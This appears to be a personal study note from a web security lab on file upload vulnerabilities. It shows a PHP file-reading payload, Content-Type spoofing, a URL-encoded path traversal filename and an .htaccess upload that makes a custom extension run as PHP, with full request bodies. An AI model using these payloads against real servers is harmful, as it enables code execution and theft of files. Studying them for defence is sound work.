File Upload Vulnerabilities

Sometimes you need to try to prepare a file to run in order to output some intresting content

<?php
echo file_get_contents('/home/carlos/secret');
?>

In some cases you need to change the content type 
Content-Type: application/x-php to "image/jpeg" or "image/png" to trick the security control

In other scenario you need to use directory trasversal to upload file and trick the control 
as shown below:

filename="exploit.php"
filename="../exploit.php" -> in this case the escape character is stripped by the back-end, 
therefore you need to URL encode it.
filename="%2e%2e%2fexploit.php" this will trick the back-end server and will allow you to have
the file available in the parent directory.



Another way is to Add another type of application for been executed by PHP

such as ".htaccess"
Here you set Content-Type: text/plain

in the content insert 
"AddType application/x-httpd-php .l33t"

This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module,
 it knows how to handle this already.

 Example below

 "
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
"

After adding this file, you need to insert this new file with the new extension as shown below:

"
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-httpd-php

<?php
echo file_get_contents('/home/carlos/secret');
?>
"
